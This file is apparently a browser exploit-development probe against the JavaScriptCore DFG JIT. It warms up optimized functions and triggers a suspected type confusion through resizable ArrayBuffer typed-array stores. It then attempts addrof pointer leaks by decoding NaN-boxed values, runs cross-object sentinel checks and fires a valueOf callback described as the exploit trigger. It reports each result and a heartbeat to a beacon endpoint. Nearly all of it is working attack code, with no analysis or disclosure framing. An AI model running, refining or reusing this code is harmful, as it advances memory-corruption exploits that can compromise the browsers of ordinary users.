/* p108 — Verify K5/K7 type confusion vs DAZ false positive
 *
 * K5/K7 in p107 returned 0 instead of 378*MIN_VALUE (denormal).
 * AMD Zen 2 DFG JIT may set MXCSR DAZ bit → denormals flush to zero.
 * If that's the case, normal doubles should read correctly.
 *
 * TESTS:
 * L1: Same sopt pattern but with NORMAL doubles (1337.1337, Math.PI)
 * L2: Same sopt pattern but oj.a = OBJECT REFERENCE (for addrof if real)
 * L3: Cross-object sentinel test — oj.a=7777, oj1.a=9999
 * L4: Direct denormal test — does DFG flush denormals?
 * L5: Real addrof attempt — if confusion is real, leak array pointer
 * L6: Multiple trigger attempts with varied sentinels
 * L7: K2 migopp pattern with non-denormal payload
 * L8: fakeobj attempt — pass crafted double, get object back
 *
 * Beacon prefix: V108L-
 */
(function(){
var RUN_ID = "v108l" + Math.random().toString(36).slice(2,12);
var PREFIX = "V108L-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press108-confverify");

var _f64 = new Float64Array(1);
var _u32 = new Uint32Array(_f64.buffer);
function f2i(f) { _f64[0] = f; return [_u32[0], _u32[1]]; }

/* ====== L1: Normal doubles — DAZ check ====== */
function test_L1() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4, {maxByteLength: 8});
    var uintArr = new Uint32Array(rab);

    function sopt1_L1(ary, ary1) {
      var a, b, c, d, e, f, g, h, l;
      l = [1, 2];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1];
      b = {}; c = {}; d = ary1.b; e = {}; f = {}; g = {}; h = {};
      uintArr[0] = ary;
      e.a = a; f.a = a; g.a = a; h.a = a;
      return ary1.a;
    }

    function sopt_L1(ary, ary1) {
      var a, b, c, d, e, f, g, h, l;
      l = [1, 2];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1];
      b = {}; c = {}; d = ary1.b; e = {}; f = {}; g = {}; h = {};
      uintArr[0] = ary;
      e.a = a; f.a = a; g.a = a; h.a = a;
      return ary1.a;
    }

    // NORMAL doubles — not denormalized
    var oj = {_a: 0, b: 0, c: 0, d: 0, a: 1337.1337};
    var oj1 = {a: 9999.9999, b: 0, c: 0, d: 0};

    for (var i = 0; i < 15000; i++) sopt1_L1(i + 1337.1337, oj1);
    for (var i = 0; i < 15000; i++) sopt_L1(i + 1337.1337, oj);

    function leak_L1(val, val1) {
      try { throw 0; } catch(_) {}
      sopt1_L1(1337.1337, val);
      return sopt_L1(13371337133713371337.1337, val1);
    }

    for (var i = 0; i < 5000; i++) leak_L1(oj1, oj);

    var result = leak_L1(oj1, oj);
    r.resultType = typeof result;
    r.resultVal = result;

    var expected = 1337.1337;
    r.expected = expected;
    r.match = (result === expected);

    if (typeof result === 'number') {
      var bits = f2i(result);
      r.lo = '0x' + (bits[0] >>> 0).toString(16);
      r.hi = '0x' + (bits[1] >>> 0).toString(16);
      // Also get expected bits
      var ebits = f2i(expected);
      r.elo = '0x' + (ebits[0] >>> 0).toString(16);
      r.ehi = '0x' + (ebits[1] >>> 0).toString(16);
    }

    // Also check: does it return oj1.a instead? (cross-object confusion)
    r.isOj1Val = (result === 9999.9999);

    r.SURVIVED = true;
    B("L1-NORMAL", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L1-ERR", r); }
}

/* ====== L2: Object reference — real addrof test ====== */
function test_L2() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4, {maxByteLength: 8});
    var uintArr = new Uint32Array(rab);

    function sopt1_L2(ary, ary1) {
      var a, b, c, d, e, f, g, h, l;
      l = [1, 2];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1];
      b = {}; c = {}; d = ary1.b; e = {}; f = {}; g = {}; h = {};
      uintArr[0] = ary;
      e.a = a; f.a = a; g.a = a; h.a = a;
      return ary1.a;
    }

    function sopt_L2(ary, ary1) {
      var a, b, c, d, e, f, g, h, l;
      l = [1, 2];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1];
      b = {}; c = {}; d = ary1.b; e = {}; f = {}; g = {}; h = {};
      uintArr[0] = ary;
      e.a = a; f.a = a; g.a = a; h.a = a;
      return ary1.a;
    }

    // oj.a is an OBJECT — if confusion is real and reads as double, leaks address
    var targetArr = new Uint8Array(16);
    var oj = {_a: 0, b: 0, c: 0, d: 0, a: targetArr};
    var oj1 = {a: 42.42, b: 0, c: 0, d: 0};

    for (var i = 0; i < 15000; i++) sopt1_L2(i + 1337.1337, oj1);
    for (var i = 0; i < 15000; i++) sopt_L2(i + 1337.1337, oj);

    function leak_L2(val, val1) {
      try { throw 0; } catch(_) {}
      sopt1_L2(1337.1337, val);
      return sopt_L2(13371337133713371337.1337, val1);
    }

    for (var i = 0; i < 5000; i++) leak_L2(oj1, oj);

    var result = leak_L2(oj1, oj);
    r.resultType = typeof result;

    if (typeof result === 'number') {
      r.LEAKED_AS_NUMBER = true;
      r.val = result;
      var bits = f2i(result);
      r.lo = '0x' + (bits[0] >>> 0).toString(16);
      r.hi = '0x' + (bits[1] >>> 0).toString(16);
      // Non-zero hi means it could be a pointer (JSC uses NaN-boxing: objects have hi >= 0xFFFE)
      if (bits[1] >= 0xFFFE0000) {
        r.LOOKS_LIKE_PTR = true;
        // Extract actual pointer (JSC: ptr = value ^ 0xFFFF000000000000)
        r.possiblePtr = '0x' + ((bits[1] ^ 0xFFFF0000) >>> 0).toString(16) +
                        (bits[0] >>> 0).toString(16).padStart(8, '0');
      }
    } else if (typeof result === 'object') {
      r.isObject = true;
      r.isSameTarget = (result === targetArr);
      try { r.objStr = String(result).slice(0, 40); } catch(e2) {}
    }

    r.SURVIVED = true;
    B("L2-ADDROF", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L2-ERR", r); }
}

/* ====== L3: Cross-object sentinel — distinguish DAZ from confusion ====== */
function test_L3() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4, {maxByteLength: 8});
    var uintArr = new Uint32Array(rab);

    function sopt1_L3(ary, ary1) {
      var a, b, c, d, e, f, g, h, l;
      l = [1, 2];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1];
      b = {}; c = {}; d = ary1.b; e = {}; f = {}; g = {}; h = {};
      uintArr[0] = ary;
      e.a = a; f.a = a; g.a = a; h.a = a;
      return ary1.a;
    }

    function sopt_L3(ary, ary1) {
      var a, b, c, d, e, f, g, h, l;
      l = [1, 2];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1];
      b = {}; c = {}; d = ary1.b; e = {}; f = {}; g = {}; h = {};
      uintArr[0] = ary;
      e.a = a; f.a = a; g.a = a; h.a = a;
      return ary1.a;
    }

    // Both use NORMAL doubles, different sentinels
    var oj = {_a: 0, b: 0, c: 0, d: 0, a: 7777.7777};
    var oj1 = {a: 8888.8888, b: 0, c: 0, d: 0};

    for (var i = 0; i < 15000; i++) sopt1_L3(i + 1337.1337, oj1);
    for (var i = 0; i < 15000; i++) sopt_L3(i + 1337.1337, oj);

    function leak_L3(val, val1) {
      try { throw 0; } catch(_) {}
      sopt1_L3(1337.1337, val);
      return sopt_L3(13371337133713371337.1337, val1);
    }

    for (var i = 0; i < 5000; i++) leak_L3(oj1, oj);

    var result = leak_L3(oj1, oj);
    r.resultType = typeof result;
    r.resultVal = result;
    r.expected_oj_a = 7777.7777;
    r.expected_oj1_a = 8888.8888;

    r.isCorrect = (result === 7777.7777);
    r.isCrossObject = (result === 8888.8888);
    r.isZero = (result === 0);

    if (r.isCrossObject) {
      r.CONFUSION_CONFIRMED = true;
    }

    if (typeof result === 'number') {
      var bits = f2i(result);
      r.lo = '0x' + (bits[0] >>> 0).toString(16);
      r.hi = '0x' + (bits[1] >>> 0).toString(16);
    }

    r.SURVIVED = true;
    B("L3-SENTINEL", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L3-ERR", r); }
}

/* ====== L4: DAZ detection — direct denormal flush test ====== */
function test_L4() {
  var r = {};
  try {
    // Test 1: Simple denormal in DFG-compiled code
    var denormal = 5e-324; // Number.MIN_VALUE
    var normal = 1.5;

    function readVal(obj) { return obj.x; }

    var dobj = {x: denormal};
    var nobj = {x: normal};

    // Warmup to DFG
    for (var i = 0; i < 100000; i++) {
      readVal(dobj);
      readVal(nobj);
    }

    var readDenorm = readVal(dobj);
    var readNorm = readVal(nobj);

    r.denormal_expected = denormal;
    r.denormal_read = readDenorm;
    r.denormal_match = (readDenorm === denormal);
    r.denormal_isZero = (readDenorm === 0);
    r.normal_match = (readNorm === normal);

    if (readDenorm === 0 && denormal !== 0) {
      r.DAZ_DETECTED = true;
    }

    // Test 2: 378 * MIN_VALUE specifically
    var subdenorm = 378 * Number.MIN_VALUE;
    var sobj = {x: subdenorm};
    for (var i = 0; i < 100000; i++) readVal(sobj);
    var readSub = readVal(sobj);
    r.sub378_expected = subdenorm;
    r.sub378_read = readSub;
    r.sub378_match = (readSub === subdenorm);
    r.sub378_isZero = (readSub === 0);

    // Test 3: Float64Array denormal
    var f = new Float64Array(1);
    f[0] = denormal;
    function readF64(arr) { return arr[0]; }
    for (var i = 0; i < 100000; i++) readF64(f);
    var readF = readF64(f);
    r.f64_match = (readF === denormal);
    r.f64_isZero = (readF === 0);

    r.SURVIVED = true;
    B("L4-DAZ", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L4-ERR", r); }
}

/* ====== L5: Multiple attempts with increasing sentinels ====== */
function test_L5() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4, {maxByteLength: 8});
    var uintArr = new Uint32Array(rab);

    function sopt1_L5(ary, ary1) {
      var a, b, c, d, e, f, g, h, l;
      l = [1, 2];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1];
      b = {}; c = {}; d = ary1.b; e = {}; f = {}; g = {}; h = {};
      uintArr[0] = ary;
      e.a = a; f.a = a; g.a = a; h.a = a;
      return ary1.a;
    }

    function sopt_L5(ary, ary1) {
      var a, b, c, d, e, f, g, h, l;
      l = [1, 2];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1];
      b = {}; c = {}; d = ary1.b; e = {}; f = {}; g = {}; h = {};
      uintArr[0] = ary;
      e.a = a; f.a = a; g.a = a; h.a = a;
      return ary1.a;
    }

    // Use clearly distinguishable sentinels
    var sentinels = [
      {oj_a: 11111.11111, oj1_a: 22222.22222},
      {oj_a: 33333.33333, oj1_a: 44444.44444},
      {oj_a: 55555.55555, oj1_a: 66666.66666},
      {oj_a: -77777.77, oj1_a: -88888.88},
      {oj_a: 1e100, oj1_a: 2e200},
    ];

    var results = [];
    for (var s = 0; s < sentinels.length; s++) {
      var sen = sentinels[s];
      var oj = {_a: 0, b: 0, c: 0, d: 0, a: sen.oj_a};
      var oj1 = {a: sen.oj1_a, b: 0, c: 0, d: 0};

      for (var i = 0; i < 15000; i++) sopt1_L5(i + 1337.1337, oj1);
      for (var i = 0; i < 15000; i++) sopt_L5(i + 1337.1337, oj);

      function leak_L5(val, val1) {
        try { throw 0; } catch(_) {}
        sopt1_L5(1337.1337, val);
        return sopt_L5(13371337133713371337.1337, val1);
      }

      for (var i = 0; i < 5000; i++) leak_L5(oj1, oj);

      var result = leak_L5(oj1, oj);
      var tag = "?";
      if (result === sen.oj_a) tag = "CORRECT";
      else if (result === sen.oj1_a) tag = "CROSS";
      else if (result === 0) tag = "ZERO";
      else tag = "OTHER:" + result;

      results.push("S" + s + ":" + tag);
    }

    r.results = results.join("|");
    r.SURVIVED = true;
    B("L5-SENTINELS", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L5-ERR", r); }
}

/* ====== L6: Int32Array variant (same as K1 pattern but with sentinel) ====== */
function test_L6() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4, {maxByteLength: 8});
    var intArr = new Int32Array(rab);

    var sentinel = 42424242;
    var witness = {val: sentinel, ptr: null};
    var targetObj = {magic: 0xBEEF};
    witness.ptr = targetObj;

    function opt_L6(thing) {
      var w1 = witness.val;
      var w2 = witness.ptr;
      intArr[0] = thing;
      var w3 = witness.val;
      var w4 = witness.ptr;
      return {
        valSame: w1 === w3,
        ptrSame: w2 === w4,
        valBefore: w1,
        valAfter: w3,
        ptrBefore: typeof w2,
        ptrAfter: typeof w4
      };
    }

    for (var i = 0; i < 100000; i++) {
      opt_L6(i + 1337.1337);
    }
    r.warmupDone = true;

    var res = opt_L6(13371337133713371337.1337);
    r.valSame = res.valSame;
    r.ptrSame = res.ptrSame;
    r.valBefore = res.valBefore;
    r.valAfter = res.valAfter;
    r.ptrBefore = res.ptrBefore;
    r.ptrAfter = res.ptrAfter;

    if (!res.valSame || !res.ptrSame) {
      r.CORRUPTION = true;
    }
    if (res.ptrAfter !== 'object') {
      r.PTR_TYPE_CHANGE = true;
    }

    r.SURVIVED = true;
    B("L6-WITNESS2", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L6-ERR", r); }
}

/* ====== L7: Int32Array — test if resizable path even differs from fixed ====== */
function test_L7() {
  var r = {};
  try {
    // Fixed AB (should NOT be vulnerable)
    var fixedAB = new ArrayBuffer(4);
    var fixedArr = new Int32Array(fixedAB);

    function opt_fixed(thing) {
      fixedArr[0] = thing;
      return fixedArr[0];
    }

    for (var i = 0; i < 100000; i++) opt_fixed(i + 1337.1337);
    var fixedResult = opt_fixed(13371337133713371337.1337);
    r.fixedResult = fixedResult;

    // Resizable AB
    var resizAB = new ArrayBuffer(4, {maxByteLength: 8});
    var resizArr = new Int32Array(resizAB);

    function opt_resiz(thing) {
      resizArr[0] = thing;
      return resizArr[0];
    }

    for (var i = 0; i < 100000; i++) opt_resiz(i + 1337.1337);
    var resizResult = opt_resiz(13371337133713371337.1337);
    r.resizResult = resizResult;

    r.sameResult = (fixedResult === resizResult);

    // Both should be 1526312960 (ToInt32 of the big number)
    r.expectedVal = 1526312960;
    r.fixedCorrect = (fixedResult === 1526312960);
    r.resizCorrect = (resizResult === 1526312960);

    r.SURVIVED = true;
    B("L7-FIXVSRESIZ", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L7-ERR", r); }
}

/* ====== L8: toString callback during PutByVal — the actual exploit trigger ====== */
function test_L8() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4, {maxByteLength: 8});
    var intArr = new Int32Array(rab);

    var callbackCount = 0;
    var callbackThis = null;

    var evilObj = {
      valueOf: function() {
        callbackCount++;
        return 13371337133713371337.1337;
      }
    };

    function opt_L8(thing) {
      var a = {}; var b = {}; var c = {}; var d = {};
      var e = {}; var f = {}; var g = {}; var h = {};
      var l = [1,2];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      l[0]; l[1]; l[0]; l[1]; l[0]; l[1]; l[0]; l[1];
      intArr[0] = thing;
      // After slow path, try to use the objects
      a.x = 1; b.x = 2; c.x = 3; d.x = 4;
      e.x = 5; f.x = 6; g.x = 7; h.x = 8;
      return [a.x, b.x, c.x, d.x, e.x, f.x, g.x, h.x];
    }

    // Warmup with numbers
    for (var i = 0; i < 100000; i++) {
      opt_L8(i + 0.5);
    }
    r.warmupDone = true;
    r.callbacksBefore = callbackCount;

    // Now trigger with valueOf — slow path via callback
    var result = opt_L8(evilObj);
    r.callbacksAfter = callbackCount;
    r.callbackFired = (callbackCount > r.callbacksBefore);

    // Check if objects got corrupted
    var anomalies = [];
    for (var i = 0; i < result.length; i++) {
      if (result[i] !== (i + 1)) {
        anomalies.push(i + ':' + result[i]);
      }
    }
    r.anomalyCount = anomalies.length;
    if (anomalies.length > 0) {
      r.CORRUPTION = true;
      r.anomalies = anomalies.join('|');
    }

    r.storedVal = intArr[0];
    r.SURVIVED = true;
    B("L8-VALUEOF", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L8-ERR", r); }
}

/* ====== Run ====== */
try {
  test_L1();
  setTimeout(test_L2, 3000);
  setTimeout(test_L3, 8000);
  setTimeout(test_L4, 12000);
  setTimeout(test_L5, 16000);
  setTimeout(test_L6, 30000);
  setTimeout(test_L7, 35000);
  setTimeout(test_L8, 40000);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 5000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe108-done"); }, 90000);
})();
